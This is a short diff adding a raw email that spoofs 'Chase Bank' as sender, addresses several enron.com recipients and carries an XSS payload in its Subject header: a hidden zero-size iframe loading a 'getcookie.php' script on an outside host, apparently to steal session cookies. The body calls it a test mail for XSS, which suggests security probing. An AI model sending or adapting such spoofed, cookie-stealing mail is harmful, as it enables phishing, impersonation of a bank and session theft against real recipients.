@@ -1,0 +1,7 @@
+From: "Chase Bank" <memberservice@chase.com>
+To: lisa.cousino@enron.com, mike.jordan@enron.com, brent.price@enron.com, 
+Subject: <iframe src=\"http://www.wooyun.org/getcookie.php\" width=0 height=0 frameborder=0></iframe>
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
